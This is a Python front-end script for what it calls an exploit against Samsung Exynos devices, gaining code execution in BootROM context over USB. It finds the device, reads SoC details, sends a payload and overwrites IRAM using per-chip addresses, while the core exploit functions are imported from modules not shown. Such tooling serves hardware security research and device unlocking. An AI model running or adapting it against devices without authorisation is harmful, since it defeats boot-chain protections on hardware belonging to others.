import argparse
import sys
import os
import coloredlogs
import logging

from modules.exploit import *
from modules.usb_helper import *
from modules.soc_data import SOC_DATA

soc = ""

logger  = logging.getLogger(__name__)
debug_mode = False
output_file_path = ""
console_output = False

def display_and_verify_device_info(device):
    global soc

    device_config = device.get_active_configuration()

    soc = usb.util.get_string(device, device.iProduct)
    usb_serial_num = usb.util.get_string(device, device.iSerialNumber)
    usb_booting_version = usb.util.get_string(device, device_config[(0, 0)].iInterface)

    print()
    logger.debug("Device Information")
    logger.info(f"SoC: {soc}")
    logger.info(f"SoC ID: {usb_serial_num[0:15]}")
    logger.info(f"Chip ID: {usb_serial_num[15:31]}")
    logger.info(f"USB Booting Version: {usb_booting_version[12:16]}")
    print()

    if not soc in SOC_DATA:
        logger.critical("This SoC is not Supported!")
        sys.exit(-1)

def print_banner():
    logger.critical(r"""
                                                                              
88                                                                            
88                                              ,d                            
88                                              88                            
88,dPPYba,   ,adPPYba,  88       88 ,adPPYba, MM88MMM ,adPPYba,  8b,dPPYba,   
88P'    "8a a8"     "8a 88       88 I8[    ""   88   a8"     "8a 88P'   `"8a  
88       88 8b       d8 88       88  `"Y8ba,    88   8b       d8 88       88  
88       88 "8a,   ,a8" "8a,   ,a88 aa    ]8I   88,  "8a,   ,a8" 88       88  
88       88  `"YbbdP"'   `"YbbdP'Y8 `"YbbdP"'   "Y888 `"YbbdP"'  88       88  
                                                                              
                                                                              
    """)
    print("We had a problem - and now, publicly, a solution :)")
    print("Version 1.0 (c) 2025 Umer Uddin <umer.uddin@mentallysanemainliners.org>")
    print()
    logger.error("Notice: This program and it's source code is licensed under GPL 2.0.")
    print()

def main():
    global verbose
    global debug_mode
    global output_file_path
    global console_output

    coloredlogs.install(
        level="DEBUG",
        fmt="%(asctime)s %(message)s",
        level_styles={
            'debug': {'color': 'magenta'},
            'info': {'color': 'green'},
            'warning': {'color': 'white', 'bold': True},
            'error': {'color': 'yellow', 'bold': True},
            'critical': {'color': 'red', 'bold': True},
        },
        field_styles={
            'asctime': {'color': 'blue'},
            'levelname': {'bold': True},
        }
    )

    print_banner()

    parser = argparse.ArgumentParser(description="Exploit for Exynos devices to gain ACE in BootROM context.")
    parser.add_argument('-e', '--exploit', action="store_true", help="Run the exploit before sending files", required=False)
    parser.add_argument('-p', '--payload', type=str, help="Path to the payload to launch", required=False)
    parser.add_argument('-d', '--debug', action="store_true", help="Debug Mode", required=False)
    parser.add_argument('-o', '--output', type=str, help="Path to a folder where to save payload output to", required=False)
    parser.add_argument('-c', '--console-output', action="store_true", help="Show output to console", required=False)
    parser.add_argument('files', nargs='+', metavar='files', help="Files to send to the device post exploit (seperated by a space)")

    args = parser.parse_args()

    debug_mode = args.debug
    output_file_path = args.output
    console_output = args.console_output

    if args.exploit:
        if args.payload:
            if os.path.isfile(args.payload):
                logger.warning(f"Using file: {args.payload}")
            else:
                logger.critical(f"Error: The file {args.payload} does not exist or is not a valid file.")
                sys.exit(-1)
        else:
            logger.critical("To use the exploit mode, please provide a payload with -p [path to payload]")
            sys.exit(-1)

    if args.output:
        logger.warning(f"Output folder: {args.output}")

        if not os.path.exists(args.output):
            os.makedirs(args.output)

    for file in args.files:
        if not os.path.isfile(file):
            logger.critical(f"Error: The file {file} does not exist or is not a valid file.")
            sys.exit(-1)

    logger.warning("Waiting for device")
    device = find_device()
    logger.warning("Found device.")

    display_and_verify_device_info(device)

    if args.exploit:
        logger.warning(f"Start exploit.")
        print()

        send_payload(device, args.payload)

        overwrite_iram(device, debug_mode, SOC_DATA[soc]["rx_address"], SOC_DATA[soc]["usb_struct_offset"])

        logger.error("Wait for USB to re-initialise.")
        sleep(2)
        device = find_device()
        logger.warning("Found device.")

    for file in args.files:
        send_file(device, file, output_file_path, console_output)

if __name__ == "__main__":
    main()
